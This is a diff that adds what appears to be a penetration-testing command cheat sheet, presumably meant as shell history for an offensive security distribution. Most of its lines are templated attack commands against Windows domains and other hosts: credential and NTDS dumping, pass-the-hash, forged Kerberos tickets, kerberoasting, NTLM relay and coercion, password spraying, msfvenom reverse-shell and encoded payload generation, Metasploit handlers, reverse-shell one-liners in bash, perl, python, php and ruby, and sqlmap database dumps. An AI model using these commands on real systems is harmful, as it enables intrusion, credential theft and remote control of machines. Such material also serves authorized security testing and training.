@@ -1,0 +1,171 @@
+awk '{print substr($1, 1, 1) $2}' f
+awk '{if (length($0) >= 2) {print $0}}' f
+awk -F ':' '{print $NF}' f
+pip install --break-system-packages
+awk '{print ""}' f > blank.lst
+find . -name '*' -type f -exec x {} \;
+apt update && apt install -y
+psexec.py <domain>/<user>:<password>@<ip>
+psexec.py -hashes <hash> <user>@<ip>
+export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
+atexec.py <domain>/<user>:<password>@<ip> "command"
+atexec.py -hashes <hash> <user>@<ip> "command"
+GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
+GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
+GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
+goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
+ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
+ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
+ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
+getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
+getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
+GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
+samrdump.py <domain>/<user>:<password>@<ip>
+secretsdump.py '<domain>/<user>:<password>'@<ip>
+secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
+secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
+secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
+secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+smbserver.py <shareName> <sharePath>
+smbserver.py -username <username> -password <password> <shareName> <sharePath>
+ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
+ntlmrelayx.py -tf <targets_file> -socks -smb2support
+ntlmrelayx.py -tf <targets_file> -smb2support
+ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
+ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
+smbclient.py <domain>/<user>:<password>@<ip>
+lookupsid.py <domain>/<user>:<password>@<ip>
+reg.py <domain>/<user>:<password>@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
+rpcdump.py <domain>/<user>:<password>@<ip>
+services.py <domain>/<user>:<password>@<ip> <action>
+getArch.py -target <ip>
+netview.py <domain>/<user> -target <ip> -users <users_file>
+bloodhound-python -d <domain> -u <user> -p <password> -c all
+bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all
+netexec smb <ip>
+netexec smb <ip> -u <user> -p '<password>' --pass-pol
+netexec smb <ip> -u '' -p ''
+netexec smb <ip> -u 'a' -p ''
+netexec smb <ip> -u <user> -p '<password>' --sessions
+netexec smb <ip> -u <user> -p '<password>' --users
+netexec smb <ip> -u <user> -p '<password>' --rid-brute
+netexec smb <ip> -u <user> -p '<password>' --groups
+netexec smb <ip> -u <user> -p '<password>' --local-groups
+netexec smb <ip> -u <user> -p <password> -d <domain> --shares
+netexec smb <ip> -u <user> -p '<password>' --disks
+netexec smb <ip> --gen-relay-list smb_targets.txt
+netexec smb <ip> -u <user> -p '<password>' --loggedon-users
+netexec smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
+netexec smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
+netexec smb <ip> -u <user> -p <password> --local-auth
+netexec smb <ip> -u <user> -H <hash> --local-auth
+netexec smb <ip> -u <user> -p <password> -d <domain>
+netexec smb <ip> --kerberos
+netexec smb <ip> -u <user> -p <password> -d <domain> --sam
+netexec smb <ip> -u <user> -p <password> -d <domain> --lsa
+netexec smb <ip> -u <user> -p <password> -d <domain> --ntds
+netexec smb <ip> -u <user> -p <password> -d <domain> -M lsassy
+netexec smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
+netexec smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
+netexec smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
+netexec smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
+netexec smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
+netexec ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
+netexec winrm <ip> -u <user> -p <password>
+netexec mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
+netexec mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+netexec mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
+coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp>
+coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp>
+coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile>
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'" <ip>
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
+msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
+msfconsole -x "use scanner/smb/smb_enum_gpp"
+responder –I eth0
+responder –I eth0 -A
+rpcclient <ip> -U "<user>%<password>" -c "enumdomusers;quit"
+rpcclient <ip> -U "<user>%<password>" -c "srvinfo;quit"
+rpcclient <ip> -c "lookupnales <name>; wmic useraccount get name,sid; quit"
+rpcclient <ip> -U "<user>%<password>" -c "querydominfo;quit"
+rpcclient <ip> -U "<user>%<password>" -c "getdompwinfo;quit"
+rpcclient <ip> -U "<user>%<password>" -c "netshareenum;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "enum;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "enumdomains;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "enumdomgroups;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "querygroup <RID>;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "querygroupmem <RID>;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "queryuser <RID>;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "getusrdompwinfo <RID>;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "lsaenumsid;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "lookupsid <SID>;quit"
+rpcclient <ip> -U "<user>%<pass>" -c "setuserinfo2 <LOGIN> 23 '<NEWPASSWORD>';quit"
+msfvenom --list payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vbapplication
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o <dll|output.dll>
+msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
+nc -nlvp <lport>
+nc -nlvp <port> -e cmd.exe
+nc -nlvp <port> -e /bin/bash
+nc -nv <ip> <port> -e cmd.exe
+nc -nv <ip> <port> -e /bin/bash
+nc -nlvp <port> > <incomming_file>
+nc -nv <ip> <port> < <file_to_send>
+bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
+perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'
+ruby -rsocket -e'f=TCPSocket.open("<lhost>",<lport>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+rlwrap nc -nlvp <port>
+python -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo
+stty rows <ROWS> cols <COLS>
+sqlmap -u <url> --dbs
+sqlmap -r <request_file>
+sqlmap -u <url> --os-shell
+sqlmap -u <url> -D <db> --tables
+sqlmap -u <url> -p <arguments> --dbs
+sqlmap -u <url> -D <db> -T <table> --dump
+sqlmap -u <url> -D <db> -T <table> --columns
+sqlmap -u <url> -D <db> -T <table> -C <c1>,<c2> --dump
+sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
+docker run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness file -f /data/<file>
+docker run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness nmap -f /data/<nmap_file>.xml
+curl -k -s <url> | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u
+ffuf -w <wordlist> -u <url>/FUZZ
+nmap -Pn -sSV --top-ports 5000 --open <ip>
+nmap -Pn -sUV --top-ports 5000 --open <ip>
+nmap -p- -sSCV -Pn <ip>
+nmap --max-rate 100 -sC -sV <ip>
+nmap -Pn -sS -T4 --open --script smb-security-mode -p445 <ip>
+dnsmasq; nginx;
